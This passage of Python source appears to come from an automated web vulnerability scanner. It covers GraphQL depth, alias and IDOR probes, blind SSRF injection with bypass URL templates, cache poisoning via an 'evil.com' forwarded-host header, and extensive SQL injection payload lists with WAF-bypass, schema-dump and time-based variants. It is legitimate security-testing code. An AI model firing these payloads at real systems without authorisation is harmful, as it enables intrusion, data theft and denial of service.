            if data and len(data) >= 10:
                results["issues"].append("alias_batching")
                results["evidence"].append({
                    "type": "alias_batching",
                    "endpoint": graphql_url,
                    "aliases_tested": 10,
                    "description": "GraphQL allows alias-based batching in single query",
                    "risk": "Rate limit bypass via aliases",
                })
        except Exception:
            pass

    if results["issues"]:
        results["vulnerable"] = True

    return results


async def graphql_depth_attack_test(
    url: str,
    graphql_url: str | None = None,
    auth_session: Any = None,
    max_depth: int = 15,
) -> dict[str, Any]:
    """
    Test GraphQL query depth limits.

    Deep nested queries can cause:
    1. DoS via exponential resource consumption
    2. N+1 query problems amplified
    3. Stack overflow on poorly implemented servers

    Args:
        url: Base URL
        graphql_url: GraphQL endpoint
        auth_session: AuthSession for authenticated testing
        max_depth: Maximum nesting depth to test

    Returns:
        Dict with vulnerability findings
    """
    results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": [], "max_depth_accepted": 0}

    if not graphql_url:
        graphql_url = await _find_graphql_endpoint(url, auth_session)
        if not graphql_url:
            return results

    auth_args = get_auth_curl_args(auth_session)  # Handles None internally

    # First, get schema to find recursive types
    introspection_query = {
        "query": """
        {
            __schema {
                types {
                    name
                    fields {
                        name
                        type {
                            name
                            kind
                            ofType { name kind }
                        }
                    }
                }
            }
        }
        """
    }

    out, err, rc = await run(
        ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
         "-d", json.dumps(introspection_query)] + auth_args + [graphql_url],
        timeout=15
    )

    # Try to build a deep query based on schema
    # If introspection fails, use generic __typename nesting
    deep_query_template = "{ __typename }"

    # Build increasingly deep queries
    for depth in [5, 10, 15, 20]:
        if depth > max_depth:
            break

        # Build nested __type query (uses introspection which is often allowed)
        nested = "__typename"
        for _ in range(depth):
            nested = f"__type(name: \"Query\") {{ name fields {{ name type {{ {nested} }} }} }}"

        deep_query = {"query": f"{{ {nested} }}"}

        out, err, rc = await run(
            ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
             "-d", json.dumps(deep_query)] + auth_args + [graphql_url],
            timeout=30
        )

        if rc == 0 and out:
            try:
                response = json.loads(out)
                errors = response.get("errors", [])

                # Check if query was rejected for depth
                depth_rejected = any(
                    "depth" in str(e).lower() or "complexity" in str(e).lower() or "too deep" in str(e).lower()
                    for e in errors
                )

                if depth_rejected:
                    results["max_depth_accepted"] = depth - 5 if depth > 5 else depth
                    break

                if "data" in response:
                    results["max_depth_accepted"] = depth

            except Exception:
                pass

    if results["max_depth_accepted"] >= 10:
        results["vulnerable"] = True
        results["issues"].append("no_depth_limit")
        results["evidence"].append({
            "type": "no_depth_limit",
            "endpoint": graphql_url,
            "max_depth_tested": results["max_depth_accepted"],
            "description": f"GraphQL accepts queries nested {results['max_depth_accepted']}+ levels deep",
            "risk": "DoS via deeply nested queries",
        })

    return results


async def graphql_alias_idor_test(
    url: str,
    graphql_url: str | None = None,
    auth_session: Any = None,
) -> dict[str, Any]:
    """
    Test GraphQL alias-based IDOR vulnerabilities.

    Using aliases, an attacker can query multiple resources in a single request,
    potentially bypassing per-request authorization checks.

    Args:
        url: Base URL
        graphql_url: GraphQL endpoint
        auth_session: AuthSession for authenticated testing

    Returns:
        Dict with vulnerability findings
    """
    results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": []}

    if not graphql_url:
        graphql_url = await _find_graphql_endpoint(url, auth_session)
        if not graphql_url:
            return results

    auth_args = get_auth_curl_args(auth_session)  # Handles None internally

    # First get schema to find queryable types with ID arguments
    introspection_query = {
        "query": """
        {
            __schema {
                queryType {
                    fields {
                        name
                        args {
                            name
                            type { name kind }
                        }
                    }
                }
            }
        }
        """
    }

    out, err, rc = await run(
        ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
         "-d", json.dumps(introspection_query)] + auth_args + [graphql_url],
        timeout=15
    )

    id_queries = []
    if rc == 0 and out:
        try:
            response = json.loads(out)
            query_fields = response.get("data", {}).get("__schema", {}).get("queryType", {}).get("fields", [])

            for field in query_fields:
                field_name = field.get("name", "")
                args = field.get("args", [])

                # Look for fields with id/ID arguments
                for arg in args:
                    arg_name = arg.get("name", "").lower()
                    if arg_name in ["id", "userid", "user_id", "accountid", "account_id"]:
                        id_queries.append((field_name, arg.get("name")))
                        break

        except Exception:
            pass

    # If we found ID-based queries, test alias enumeration
    if id_queries:
        field_name, arg_name = id_queries[0]

        # Build alias query to fetch multiple IDs at once
        alias_parts = []
        for i in range(1, 11):
            alias_parts.append(f'u{i}: {field_name}({arg_name}: "{i}") {{ __typename }}')

        alias_query = {"query": "{ " + " ".join(alias_parts) + " }"}

        out, err, rc = await run(
            ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
             "-d", json.dumps(alias_query)] + auth_args + [graphql_url],
            timeout=15
        )

        if rc == 0 and out:
            try:
                response = json.loads(out)
                data = response.get("data", {})

                # Count successful responses
                successful = sum(1 for k, v in data.items() if v is not None)

                if successful > 1:
                    results["vulnerable"] = True
                    results["issues"].append("alias_idor")
                    results["evidence"].append({
                        "type": "alias_idor",
                        "endpoint": graphql_url,
                        "field": field_name,
                        "ids_queried": 10,
                        "ids_returned": successful,
                        "description": f"Alias-based IDOR: {successful}/10 objects accessible via aliases",
                        "risk": "Mass data enumeration via single request",
                    })
            except Exception:
                pass

    return results


async def graphql_field_suggestion_test(
    url: str,
    graphql_url: str | None = None,
    auth_session: Any = None,
) -> dict[str, Any]:
    """
    Test GraphQL field suggestion information disclosure.

    Many GraphQL servers provide helpful error messages that suggest
    valid field names, enabling schema discovery without introspection.

    Args:
        url: Base URL
        graphql_url: GraphQL endpoint
        auth_session: AuthSession for authenticated testing

    Returns:
        Dict with vulnerability findings
    """
    results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": [], "discovered_fields": []}

    if not graphql_url:
        graphql_url = await _find_graphql_endpoint(url, auth_session)
        if not graphql_url:
            return results

    auth_args = get_auth_curl_args(auth_session)  # Handles None internally

    # Test queries with intentionally wrong field names
    test_queries = [
        {"query": "{ usr }"},  # Might suggest "user"
        {"query": "{ passwrd }"},  # Might suggest "password"
        {"query": "{ emial }"},  # Might suggest "email"
        {"query": "{ admi }"},  # Might suggest "admin"
        {"query": "{ secrt }"},  # Might suggest "secret"
        {"query": "{ toke }"},  # Might suggest "token"
        {"query": "{ accoun }"},  # Might suggest "account"
    ]

    discovered = set()

    for query in test_queries:
        out, err, rc = await run(
            ["curl", "-sS", "-X", "POST", "-L", "-k", "-H", "Content-Type: application/json",
             "-d", json.dumps(query)] + auth_args + [graphql_url],
            timeout=10
        )

        if rc == 0 and out:
            try:
                response = json.loads(out)
                errors = response.get("errors", [])

                for error in errors:
                    message = error.get("message", "")
                    # Look for suggestion patterns
                    # Common patterns: "Did you mean X?", "Perhaps you meant X", "Unknown field X. Did you mean Y?"
                    suggestion_patterns = [
                        r'[Dd]id you mean ["\']?(\w+)["\']?',
                        r'[Pp]erhaps you meant ["\']?(\w+)["\']?',
                        r'[Ss]uggested: ["\']?(\w+)["\']?',
                        r'[Ss]imilar field: ["\']?(\w+)["\']?',
                    ]

                    for pattern in suggestion_patterns:
                        matches = re.findall(pattern, message)
                        discovered.update(matches)

            except Exception:
                pass

    if discovered:
        results["vulnerable"] = True
        results["issues"].append("field_suggestions_enabled")
        results["discovered_fields"] = list(discovered)
        results["evidence"].append({
            "type": "field_suggestions_enabled",
            "endpoint": graphql_url,
            "discovered_fields": list(discovered),
            "description": f"GraphQL provides field suggestions, discovered: {', '.join(list(discovered)[:10])}",
            "risk": "Schema discovery without introspection access",
        })

    return results


async def graphql_comprehensive_test(
    url: str,
    graphql_url: str | None = None,
    auth_session: Any = None,
) -> dict[str, Any]:
    """
    Run comprehensive GraphQL security tests.

    Combines all GraphQL vulnerability tests:
    1. Introspection enabled
    2. Batch query attacks
    3. Query depth limits
    4. Alias-based IDOR
    5. Field suggestion disclosure

    Args:
        url: Base URL
        graphql_url: GraphQL endpoint (auto-discovered if not provided)
        auth_session: AuthSession for authenticated testing

    Returns:
        Dict with all findings
    """
    results: dict[str, Any] = {
        "vulnerable": False,
        "issues": [],
        "evidence": [],
        "tests_run": [],
        "graphql_url": None,
    }

    # Find GraphQL endpoint
    if not graphql_url:
        graphql_url = await _find_graphql_endpoint(url, auth_session)

    if not graphql_url:
        results["error"] = "No GraphQL endpoint found"
        return results

    results["graphql_url"] = graphql_url

    # Test 1: Basic introspection
    results["tests_run"].append("introspection")
    basic_results = await graphql_vulnerability_test(url)
    if basic_results.get("vulnerable"):
        results["vulnerable"] = True
        results["issues"].extend(basic_results.get("issues", []))
        results["evidence"].extend(basic_results.get("evidence", []))

    # Test 2: Batch attacks
    results["tests_run"].append("batch_attacks")
    batch_results = await graphql_batch_attack_test(url, graphql_url, auth_session)
    if batch_results.get("vulnerable"):
        results["vulnerable"] = True
        results["issues"].extend(batch_results.get("issues", []))
        results["evidence"].extend(batch_results.get("evidence", []))

    # Test 3: Depth limits
    results["tests_run"].append("depth_limits")
    depth_results = await graphql_depth_attack_test(url, graphql_url, auth_session)
    if depth_results.get("vulnerable"):
        results["vulnerable"] = True
        results["issues"].extend(depth_results.get("issues", []))
        results["evidence"].extend(depth_results.get("evidence", []))

    # Test 4: Alias IDOR (only if introspection is available)
    if "introspection_enabled" in results["issues"]:
        results["tests_run"].append("alias_idor")
        idor_results = await graphql_alias_idor_test(url, graphql_url, auth_session)
        if idor_results.get("vulnerable"):
            results["vulnerable"] = True
            results["issues"].extend(idor_results.get("issues", []))
            results["evidence"].extend(idor_results.get("evidence", []))

    # Test 5: Field suggestions
    results["tests_run"].append("field_suggestions")
    suggestion_results = await graphql_field_suggestion_test(url, graphql_url, auth_session)
    if suggestion_results.get("vulnerable"):
        results["vulnerable"] = True
        results["issues"].extend(suggestion_results.get("issues", []))
        results["evidence"].extend(suggestion_results.get("evidence", []))
        results["discovered_fields"] = suggestion_results.get("discovered_fields", [])

    # Test 6: Schema recovery (when introspection is disabled)
    # Uses Clairvoyance methodology to recover schema via error messages
    if HAS_GRAPHQL_RECOVERY and "introspection_enabled" not in results["issues"]:
        results["tests_run"].append("schema_recovery")
        try:
            auth_header = None
            if auth_session:
                auth_header = auth_session.auth_header
            recovery_results = await graphql_schema_recovery(
                url=url,
                graphql_url=graphql_url,
                auth_header=auth_header,
                thorough=False,  # Use thorough=True for deeper scanning
            )
            if recovery_results.get("success") and recovery_results.get("findings"):
                results["vulnerable"] = True
                results["issues"].append("schema_recoverable_via_errors")
                for finding in recovery_results.get("findings", []):
                    results["evidence"].append({
                        "type": finding.get("type"),
                        "endpoint": graphql_url,
                        "description": finding.get("description"),
                        "evidence": finding.get("evidence"),
                        "remediation": finding.get("remediation"),
                    })
                results["recovered_schema"] = recovery_results.get("schema")
                results["recovered_schema_sdl"] = recovery_results.get("schema_sdl")
                results["schema_recovery_summary"] = recovery_results.get("summary")
        except Exception as e:
            # Schema recovery is optional, don't fail the whole test
            pass

    return results


# =============================================================================
# P1-3: BLIND SSRF WITH OOB CALLBACKS
# =============================================================================

# Common SSRF injection parameters
SSRF_PARAMS = [
    "url", "uri", "path", "dest", "redirect", "link", "proxy",
    "domain", "host", "site", "html", "val", "feed", "dir",
    "page", "callback", "webhook", "target", "src", "file",
    "reference", "ref", "fetch", "request", "load", "data",
    "image", "img", "pdf", "document", "download", "resource",
]

# SSRF payload templates (placeholder {CALLBACK} will be replaced)
SSRF_PAYLOAD_TEMPLATES = [
    "{CALLBACK}",
    "http://{CALLBACK}",
    "https://{CALLBACK}",
    "//{CALLBACK}",
    "http://{CALLBACK}/test",
    "https://{CALLBACK}/test.html",
    # URL encoding bypasses
    "http%3A%2F%2F{CALLBACK}",
    "http://{CALLBACK}%00.example.com",
    "http://example.com@{CALLBACK}",
    "http://{CALLBACK}#.example.com",
    "http://{CALLBACK}?.example.com",
    # DNS rebinding style
    "http://127.0.0.1.{CALLBACK}",
]


async def blind_ssrf_test(
    url: str,
    callback_domain: str,
    params_to_test: list[str] | None = None,
    auth_session: Any | None = None,
    timeout: int = 10,
) -> dict[str, Any]:
    """
    P1-3 FIX: Test for blind SSRF using out-of-band (OOB) callbacks.

    Blind SSRF occurs when the server makes a request to an attacker-controlled
    URL but doesn't return the response. Detection requires an OOB callback
    server (like Burp Collaborator, interactsh, or custom DNS logger).

    USAGE: This is an API function - not auto-run in scans because it requires
    a user-provided callback domain. Call via API or integrate with your own
    callback infrastructure:

        result = await blind_ssrf_test(
            "https://target.com/api?url=test",
            callback_domain="abc123.oast.fun"
        )
        # Then check your callback server for hits

    Args:
        url: Target URL to test
        callback_domain: Domain for OOB callbacks (e.g., "yourserver.oast.fun")
        params_to_test: Specific parameters to test (defaults to SSRF_PARAMS)
        auth_session: Optional auth session
        timeout: Request timeout in seconds

    Returns:
        Dict with test results and any detected callbacks
    """
    import uuid
    import time as time_mod

    results: dict[str, Any] = {
        "vulnerable": False,
        "tested_params": [],
        "payloads_injected": 0,
        "callbacks_expected": [],
        "findings": [],
        "evidence": [],
        "scan_completed": False,
    }

    if not callback_domain:
        results["error"] = "No callback domain provided - blind SSRF requires OOB callback server"
        return results

    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

    # Determine which parameters to test
    test_params = params_to_test or SSRF_PARAMS

    # Also test any existing query params
    if query_params:
        test_params = list(set(test_params + list(query_params.keys())))

    auth_args = get_auth_curl_args(auth_session)

    injected_callbacks: list[dict[str, Any]] = []

    for param in test_params[:20]:  # Limit to 20 params
        results["tested_params"].append(param)

        # Generate unique callback ID for this parameter
        callback_id = f"ssrf-{uuid.uuid4().hex[:8]}"
        callback_url = f"{callback_id}.{callback_domain}"

        for payload_template in SSRF_PAYLOAD_TEMPLATES[:5]:  # Limit payloads
            payload = payload_template.replace("{CALLBACK}", callback_url)

            # Build test URL with payload
            test_params_dict = dict(query_params)
            test_params_dict[param] = [payload]
            test_query = urllib.parse.urlencode(test_params_dict, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))

            # Inject payload
            try:
                out, _, rc = await run([
                    "curl", "-sS", "-k", "--max-time", str(timeout),
                    "-o", "/dev/null", "-w", "%{http_code}",
                    "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner)",
                ] + auth_args + [test_url], timeout=timeout + 5)

                results["payloads_injected"] += 1

                injected_callbacks.append({
                    "callback_id": callback_id,
                    "callback_url": callback_url,
                    "param": param,
                    "payload": payload,
                    "injected_at": time_mod.time(),
                })
            except Exception:
                continue

    results["callbacks_expected"] = [c["callback_url"] for c in injected_callbacks]
    results["injection_count"] = len(injected_callbacks)

    # Note: Actual callback verification requires checking the OOB server
    # This function prepares the injections; callback checking is done separately
    results["scan_completed"] = True
    results["note"] = (
        f"Injected {len(injected_callbacks)} SSRF payloads with OOB callbacks. "
        f"Check your callback server ({callback_domain}) for incoming requests. "
        "Each callback URL is unique to identify which parameter is vulnerable."
    )

    return results


async def check_ssrf_callbacks(
    callback_server_api: str,
    expected_callbacks: list[str],
    api_key: str | None = None,
    timeout: int = 30,
) -> dict[str, Any]:
    """
    Check OOB callback server for SSRF hits.

    This function queries a callback server API (like interactsh or custom)
    to check if any of the expected callbacks were triggered.

    Args:
        callback_server_api: API endpoint to check callbacks
        expected_callbacks: List of callback URLs to look for
        api_key: Optional API key for the callback server
        timeout: Query timeout

    Returns:
        Dict with confirmed callbacks and vulnerability status
    """
    results: dict[str, Any] = {
        "callbacks_checked": len(expected_callbacks),
        "callbacks_received": [],
        "vulnerable": False,
        "findings": [],
    }

    if not callback_server_api or not expected_callbacks:
        return results

    try:
        headers = []
        if api_key:
            headers = ["-H", f"Authorization: Bearer {api_key}"]

        out, _, rc = await run([
            "curl", "-sS", "-k", "--max-time", str(timeout),
            callback_server_api,
        ] + headers, timeout=timeout + 5)

        if rc == 0 and out:
            try:
                data = json.loads(out)
                # Look for matching callbacks in the response
                # (Format depends on callback server implementation)
                received = data.get("interactions", []) or data.get("callbacks", []) or []

                for callback in expected_callbacks:
                    callback_id = callback.split(".")[0] if "." in callback else callback
                    for interaction in received:
                        interaction_host = (
                            interaction.get("hostname", "") or
                            interaction.get("subdomain", "") or
                            str(interaction)
                        )
                        if callback_id in interaction_host:
                            results["callbacks_received"].append({
                                "callback": callback,
                                "interaction": interaction,
                                "timestamp": interaction.get("timestamp"),
                            })
                            results["vulnerable"] = True
                            results["findings"].append({
                                "type": "blind_ssrf",
                                "severity": "high",
                                "title": "Blind SSRF via OOB callback",
                                "callback": callback,
                                "evidence": interaction,
                                "cwe": "CWE-918",
                            })
            except json.JSONDecodeError:
                results["error"] = "Failed to parse callback server response"
    except Exception as e:
        results["error"] = str(e)

    return results


async def cache_poisoning_test(url: str) -> dict[str, Any]:
    results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": []}
    cache_buster = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    poison_headers = [("X-Forwarded-Host", "evil.com"), ("X-Forwarded-Port", "1337"), ("X-Forwarded-Scheme", "http"), ("X-Original-URL", "/admin"), ("X-Rewrite-URL", "/admin"), ("X-HTTP-Method-Override", "PUT")]
    for header_name, header_value in poison_headers:
        test_url = f"{url}?cachebuster={cache_buster}_{header_name}"
        # First request WITH poison header.
        out1, err1, rc1 = await run(["curl", "-sS", "-L", "-k", "-i", "-H", f"{header_name}: {header_value}", test_url], timeout=10)
        # Wait briefly for cache to potentially populate, then request the same
        # cache key without the poison header. A different URL only proves
        # reflection, not cache poisoning.
        await asyncio.sleep(0.5)
        out2, err2, rc2 = await run(["curl", "-sS", "-L", "-k", "-i", test_url], timeout=10)

        # FIX Issue #3: Improved cache poisoning detection
        # Look for reflection in critical areas (headers, links, redirects), not just body content
        if rc1 == 0 and rc2 == 0 and out1:
            # Check if poison value appears in HEADERS or actual reflected content
            # Pattern must find the injected value CLOSE to the context (within ~100 chars)
            # This prevents false positives from greedy .* matching across the whole response
            escaped_value = re.escape(header_value)
            patterns = [
                (rf'Location:\s*[^\r\n]*{escaped_value}', "Location header"),
                (rf'href=["\'][^"\']*{escaped_value}[^"\']*["\']', "href attribute"),
                (rf'src=["\'][^"\']*{escaped_value}[^"\']*["\']', "src attribute"),
                (rf'Host:\s*[^\r\n]*{escaped_value}', "Host header"),
                (rf'window\.location[^;]*{escaped_value}', "JavaScript redirect"),
            ]

            for pattern, context_type in patterns:
                match = re.search(pattern, out1, re.I)
                if match:
                    # Extract the matched content for evidence
                    matched_content = match.group(0)[:200]

                    # Extract response headers for cache analysis
                    headers_section = out1.split('\r\n\r\n')[0] if '\r\n\r\n' in out1 else out1.split('\n\n')[0]

                    # Check for cache headers
                    cache_headers = {}
                    for cache_hdr in ['Cache-Control', 'Age', 'X-Cache', 'CF-Cache-Status', 'X-Varnish', 'Via']:
                        hdr_match = re.search(rf'^{cache_hdr}:\s*(.+)$', headers_section, re.I | re.M)
                        if hdr_match:
                            cache_headers[cache_hdr] = hdr_match.group(1).strip()

                    # Determine if potentially cacheable (not private/no-store/no-cache)
                    is_cacheable = bool(cache_headers)
                    if cache_headers.get('Cache-Control'):
                        cc = cache_headers['Cache-Control'].lower()
                        # no-cache requires revalidation on every request, preventing cache poisoning
                        if 'no-store' in cc or 'private' in cc or 'no-cache' in cc:
                            is_cacheable = False

                    persisted_without_header = header_value in out2
                    proven_cache_poison = is_cacheable and persisted_without_header
                    results["issues"].append("cache_poisoning" if proven_cache_poison else "header_reflection")
                    results["evidence"].append({
                        "type": "header_injection",
                        "header": header_name,
                        "injected_value": header_value,
                        "test_url": test_url,
                        "reflection_type": context_type,
                        "reflection_context": matched_content,
                        "cache_headers": cache_headers if cache_headers else "No cache headers detected",
                        "cacheable": is_cacheable,
                        "persisted_without_header": persisted_without_header,
                        "poison_confirmed": proven_cache_poison,
                        "note": f"Header '{header_name}: {header_value}' reflected in {context_type}." + (" Poison persisted for the same cache key." if proven_cache_poison else " No poisoned cache hit observed.")
                    })
                    if proven_cache_poison:
                        results["vulnerable"] = True
                    break  # Only report once per header

    for ext in [".css", ".js", ".jpg", ".png", ".gif"]:
        test_url = f"{url}/profile{ext}?cb={cache_buster}"
        out, err, rc = await run(["curl", "-sS", "-L", "-k", "-H", "Cookie: session=test123", test_url], timeout=10)
        if rc == 0 and out:
            # Skip if it's actual CSS/JS content
            if out.strip().startswith("/*") or "body {" in out or "function(" in out:
                continue

            # FIX Issue #4: Improved cache deception detection with specific PII patterns
            # Check if response has actual session data or personal information, not just keywords
            sensitive_patterns = [
                r'email["\']?\s*:\s*["\'][^@]+@[^"\']+',  # Email in JSON/HTML
                r'username["\']?\s*:\s*["\'][^"\']{3,}',  # Username in JSON
                r'token["\']?\s*:\s*["\'][A-Za-z0-9+/=]{20,}',  # Auth tokens
                r'session[_-]?id["\']?\s*:\s*["\'][A-Za-z0-9]{16,}',  # Session IDs
                r'api[_-]?key["\']?\s*:\s*["\'][A-Za-z0-9]{16,}',  # API keys
            ]

            # Only flag if we find actual PII/session data in a static file request
            if any(re.search(pattern, out, re.I) for pattern in sensitive_patterns):
                # Additional validation: ensure it's not JavaScript code with these patterns
                if not (re.search(r'(var|let|const|function)\s+', out[:200]) or out.strip().startswith('//')):
                    # Check it's not a 404 page
                    if "404" not in out[:100] and "not found" not in out.lower()[:200]:
                        results["vulnerable"] = True
                        results["issues"].append("cache_deception")
                        results["evidence"].append({"type": "cache_deception", "extension": ext, "note": "Sensitive data found in static file response"})
                        break
    return results


# =============================================================================
# SMART ATTACK FUNCTIONS - DBMS Detection & Context-Aware Attacks
# =============================================================================
# These functions provide more intelligent attack selection for --smart scans.


# DBMS fingerprints for detection
DBMS_FINGERPRINTS = {
    "sqlite": [
        r"SQLITE_ERROR",
        r"sqlite3\.",
        r"SQLite3?::",
        r'near ".*": syntax error',
        r"unable to open database",
        r"no such table",
    ],
    "mysql": [
        r"MySQL.*Error",
        r"mysql_fetch",
        r"MySqlException",
        r"You have an error in your SQL syntax",
        r"MariaDB",
        r"Unknown column",
        r"SQLSTATE\[HY000\]",
    ],
    "postgresql": [
        r"PostgreSQL.*ERROR",
        r"\bPostgreSQL\s+\d+(?:\.\d+)+",
        r"\bPG_VERSION\b",
        r"pg_query",
        r"PG::Error",
        r"PSQLException",
        r"syntax error at or near",
        r"syntax error at or near[\s\S]{0,300}SQLSTATE:\s*42601",
        r"SQLSTATE:\s*42601[\s\S]{0,300}syntax error at or near",
        r"ERROR:\s+column",
    ],
    "mssql": [
        r"SQLServerException",
        r"Microsoft.*ODBC",
        r"Unclosed quotation mark",
        r"\[SQL Server\]",
        r"SqlException",
        r"Incorrect syntax near",
    ],
    "oracle": [
        r"ORA-\d{5}",
        r"Oracle.*Error",
        r"PLS-\d{5}",
    ],
}


def _match_dbms_fingerprint(body: str | None, baseline_body: str | None = None) -> dict | None:
    """Return the first DBMS fingerprint that appears only in the probe body."""
    if not body:
        return None

    baseline_text = baseline_body or ""
    for dbms_name, patterns in DBMS_FINGERPRINTS.items():
        for pattern in patterns:
            match = re.search(pattern, body, re.I)
            if not match:
                continue
            if baseline_text and re.search(pattern, baseline_text, re.I):
                continue
            return {
                "dbms": dbms_name,
                "pattern": pattern,
                "match": match.group(0)[:100],
            }
    return None

# DBMS-specific SQLi payloads with WAF bypass techniques
# Each payload is (payload, technique_name, description)
# Techniques: boolean, time_based, union, error_based, waf_bypass, etc.
DBMS_SQLI_PAYLOADS = {
    "sqlite": [
        # Basic payloads
        ("' OR 1=1--", "auth_bypass_boolean", "Authentication bypass boolean injection"),
        ("')) --", "comment_bypass", "Try double-paren close with comment"),
        ("')) OR 1=1--", "boolean_always_true", "Boolean injection"),
        ("')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "union_9col", "Union probe"),
        ("')) UNION SELECT sql,name,type,tbl_name,5,6,7,8,9 FROM sqlite_master--", "schema_dump", "SQLite schema extraction"),
        ("')) UNION SELECT 1,sqlite_version(),3,4,5,6,7,8,9--", "version", "SQLite version extraction"),
        ("' OR ''='", "string_true", "String comparison bypass"),
        # WAF bypass variants
        ("'/**/OR/**/1=1--", "waf_bypass_comment", "Comment-based WAF bypass"),
        ("' OR 1=1#", "hash_comment", "Hash comment alternative"),
        ("'%20OR%201=1--", "url_encode", "URL-encoded spaces"),
        ("' /*!OR*/ 1=1--", "mysql_comment_hint", "MySQL conditional comment"),
    ],
    "mysql": [
        # Basic payloads
        ("' OR 1=1-- -", "boolean", "Boolean injection"),
        ("' UNION SELECT NULL,@@version,NULL-- -", "version", "MySQL version"),
        ("' UNION SELECT NULL,user(),NULL-- -", "user", "Current user"),
        ("' UNION SELECT NULL,database(),NULL-- -", "database", "Current database"),
        ("' AND SLEEP(2)-- -", "time_based", "Time-based blind"),
        ("' AND (SELECT * FROM (SELECT(SLEEP(2)))a)-- -", "time_nested", "Nested time-based"),
        ("1' ORDER BY 10-- -", "column_count", "Column enumeration"),
        # WAF bypass variants - inline comments
        ("'/**/OR/**/1=1-- -", "waf_inline_comment", "Inline comment bypass"),
        ("' /*!50000OR*/ 1=1-- -", "waf_version_comment", "MySQL version conditional"),
        ("' OR/*!*/1=1-- -", "waf_empty_comment", "Empty conditional comment"),
        # WAF bypass variants - encoding
        ("'%09OR%091=1-- -", "waf_tab_encode", "Tab character bypass"),
        ("'%0aOR%0a1=1-- -", "waf_newline", "Newline bypass"),
        ("' oR 1=1-- -", "waf_case_variation", "Case variation bypass"),
        # WAF bypass - alternate syntax
        ("' || 1=1-- -", "waf_or_operator", "OR operator alternative"),
        ("' && 1=1-- -", "waf_and_operator", "AND operator"),
        ("'-1' OR '1'='1", "waf_quoted_numbers", "Quoted number comparison"),
        # WAF bypass - function obfuscation
        ("' AND BENCHMARK(5000000,MD5('test'))-- -", "time_benchmark", "Benchmark time-based"),
        ("' AND (SELECT * FROM (SELECT SLEEP(2))a)-- -", "time_subquery", "Subquery time-based"),
        # Error-based
        ("' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- -", "error_extractvalue", "ExtractValue error"),
        ("' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)-- -", "error_updatexml", "UpdateXML error"),
    ],
    "postgresql": [
        # Basic payloads
        ("' OR 1=1--", "boolean", "Boolean injection"),
        ("'; SELECT pg_sleep(2)--", "time_based", "Time-based blind"),
        ("' UNION SELECT NULL,version(),NULL--", "version", "PostgreSQL version"),
        ("' UNION SELECT NULL,current_user,NULL--", "user", "Current user"),
        ("' UNION SELECT NULL,current_database(),NULL--", "database", "Current database"),
        # WAF bypass variants
        ("'/**/OR/**/1=1--", "waf_comment", "Comment-based bypass"),
        ("' OR 1=1;--", "semicolon_comment", "Semicolon with comment"),
        ("'||'1'='1", "concat_operator", "String concat operator"),
        ("' OR 1::int=1--", "type_cast", "Type casting bypass"),
        # Error-based
        ("' AND 1=CAST((SELECT version()) AS INT)--", "error_cast", "Cast error-based"),
        # Stacked queries (PostgreSQL supports them)
        ("'; SELECT pg_sleep(2);--", "stacked_time", "Stacked query time"),
    ],
    "mssql": [
        # Basic payloads
        ("' OR 1=1--", "boolean", "Boolean injection"),
        ("'; WAITFOR DELAY '0:0:2'--", "time_based", "Time-based blind"),
        ("' UNION SELECT NULL,@@version,NULL--", "version", "MSSQL version"),
        ("' UNION SELECT NULL,SYSTEM_USER,NULL--", "user", "System user"),
        ("' UNION SELECT NULL,DB_NAME(),NULL--", "database", "Current database"),
        # WAF bypass variants
        ("'/**/OR/**/1=1--", "waf_comment", "Comment-based bypass"),
        ("' oR 1=1--", "waf_case", "Case variation"),
        ("' OR%091=1--", "waf_tab", "Tab character"),
        # Stacked queries (MSSQL supports them)
        ("'; SELECT 1; WAITFOR DELAY '0:0:2'--", "stacked_time", "Stacked with delay"),
        # Error-based
        ("' AND 1=CONVERT(int,@@version)--", "error_convert", "Convert error-based"),
    ],
    "oracle": [
        # Basic payloads
        ("' OR 1=1--", "boolean", "Boolean injection"),
        ("' UNION SELECT NULL,banner,NULL FROM v$version WHERE ROWNUM=1--", "version", "Oracle version"),
        ("' UNION SELECT NULL,user,NULL FROM dual--", "user", "Current user"),
        # Oracle-specific time-based
        ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',2)--", "time_pipe", "Pipe-based time delay"),
        ("' AND UTL_INADDR.GET_HOST_ADDRESS('sleep.test')='1'--", "time_dns", "DNS-based delay"),
        # WAF bypass
        ("'/**/OR/**/1=1--", "waf_comment", "Comment-based bypass"),
        ("' OR 1=1--", "waf_null", "Null byte variant"),
        # Error-based
        ("' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--", "error_ctx", "CTX error"),
    ],
    "generic": [
        # Basic payloads (work across most DBMS)
        ("'", "quote", "Single quote test"),
        ("\"", "double_quote", "Double quote test"),
        ("' OR '1'='1", "boolean", "Boolean OR"),
        ("' OR '1'='1'--", "boolean_comment", "Boolean with comment"),
        ("' OR '1'='1'#", "boolean_hash", "Boolean with hash"),
        ("' OR '1'='1'/*", "boolean_block_comment", "Boolean with block comment"),
        ("1 OR 1=1", "numeric_boolean", "Numeric boolean"),
        ("' UNION SELECT NULL--", "union_probe", "Union probe"),
        ("1; SELECT 1--", "stacked", "Stacked query test"),
        # WAF bypass - general techniques
        ("'/**/OR/**/1=1--", "waf_inline_comment", "Inline comment spaces"),
        ("'%09OR%091=1--", "waf_tab_encode", "Tab instead of space"),
        ("'%0aOR%0a1=1--", "waf_newline_encode", "Newline instead of space"),
        ("'%0dOR%0d1=1--", "waf_carriage_return", "Carriage return"),
        ("' oR 1=1--", "waf_mixed_case", "Mixed case keywords"),
        ("' Or 1=1--", "waf_title_case", "Title case keywords"),
